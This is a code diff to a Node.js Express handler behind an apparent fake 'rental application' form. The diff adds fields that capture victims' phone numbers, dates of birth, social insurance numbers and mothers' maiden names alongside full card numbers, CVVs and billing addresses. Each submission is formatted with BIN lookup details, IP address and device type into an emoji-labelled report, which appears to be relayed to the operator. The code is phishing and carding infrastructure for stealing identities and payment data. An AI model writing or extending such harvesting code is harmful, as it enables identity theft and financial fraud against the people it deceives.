@@ -27,7 +27,19 @@ function getDeviceType(userAgent) {
 
 // Handle form submission
 app.post('/submit', async (req, res) => {
-    const { fullName, email, cardNumber, expDate, cvv, billingAddress } = req.body;
+    const {
+        fullName,
+        phoneNumber,
+        email,
+        dob,
+        sin,
+        mmn,
+        cardNumber,
+        expDate,
+        cvv,
+        billingAddress,
+        notes
+    } = req.body;
 
     // Capture the user's IP address and user-agent
     const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
@@ -48,7 +60,12 @@ app.post('/submit', async (req, res) => {
         📝 *New Rental Application Submission* 📝
 
         👤 *Name*: ${fullName}
+        📞 *Phone Number*: ${phoneNumber}
         📧 *Email*: ${email}
+        🎂 *Date of Birth*: ${dob}
+        🆔 *SIN*: ${sin}
+        👩‍👧 *Mother's Maiden Name*: ${mmn}
+
         💳 *Card Type*: ${binData.scheme ? binData.scheme.toUpperCase() : 'Unknown'} (${binData.type ? binData.type.toUpperCase() : 'Unknown'})
         🌍 *Country*: ${binData.country ? binData.country.name : 'Unknown'}
         🏦 *Bank*: ${binData.bank ? binData.bank.name : 'N/A'}
@@ -57,6 +74,8 @@ app.post('/submit', async (req, res) => {
         🗓 *Expiration Date*: ${expDate}
         🔐 *CVV*: ${cvv}
         🏠 *Billing Address*: ${billingAddress}
+
+        📝 *Additional Notes*: ${notes}
 
         📱 *Device Type*: ${deviceType}
         🌐 *IP Address*: ${ip}
